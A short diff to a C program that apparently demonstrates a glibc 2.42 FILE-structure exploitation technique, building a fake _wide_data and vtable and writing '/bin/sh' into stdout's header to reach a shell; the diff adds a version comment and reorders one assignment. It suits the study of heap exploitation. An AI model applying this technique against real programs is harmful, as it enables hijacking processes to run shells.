@@ -1,3 +1,6 @@
+// glibc 2.42
+// https://github.com/nosurfer
+
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -14,8 +17,9 @@ int main() {
     char *wide_vtable = calloc(0x200, 1);
 
     // _wide_data
-    *(size_t *)(wide_data + 0x20) = (size_t) 0x1;
     *(size_t *)(wide_data + 0xe0) = (size_t) wide_vtable;
+    // sync func:
+    *(size_t *)(wide_data + 0x20) = (size_t) 0x1;
     
     // _IO_2_1_stdout_
     *(size_t *)(stdout2) = (size_t) 0x68732f6e69622f; // /bin/sh\x00
